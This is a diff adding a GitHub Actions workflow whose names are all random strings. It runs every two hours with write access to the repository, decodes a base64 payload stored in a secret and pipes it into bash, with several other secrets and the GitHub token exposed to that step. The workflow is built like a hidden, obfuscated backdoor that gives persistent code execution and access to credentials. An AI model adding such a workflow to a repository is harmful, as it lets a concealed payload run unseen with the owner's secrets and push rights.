@@ -1,0 +1,21 @@
+name: c2LCNi
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  sCV4MknzRIr:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.uYcMF8N }}
+      - name: ymS0boxOD
+        env:
+          fcFKYgb: ${{ secrets.g2hmuzS0pdw }}
+          dY5J6RP6V: ${{ secrets.jcoMsHQgasAIP }}
+          sEgEEmJ: ${{ secrets.xG8T5M6GRFLWar }}
+          GITHUB_TOKEN: ${{ secrets.uYcMF8N }}
+        run: echo "$fcFKYgb" | base64 -d | bash
